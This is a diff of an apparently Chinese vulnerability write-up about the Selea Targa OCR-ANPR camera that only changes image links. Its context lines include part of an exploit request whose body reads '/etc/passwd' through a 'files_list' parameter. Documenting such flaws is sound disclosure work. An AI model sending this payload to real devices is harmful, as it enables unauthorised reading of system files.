@@ -28,7 +28,7 @@ Selea Selea Targa IP OCR-ANPR Camera Targa 704 ILB
 
 登录页面如下
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202140933858.png)
+![](./images/202202140933858.png)
 
 发送如下请求包
 
@@ -45,4 +45,4 @@ Cookie: lang=en; PHPSESSID=bvib0lq6lahlhbjnfv91k13ou0
 name=test&files_list=/etc/passwd
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202140933222.png)
+![](./images/202202140933222.png)
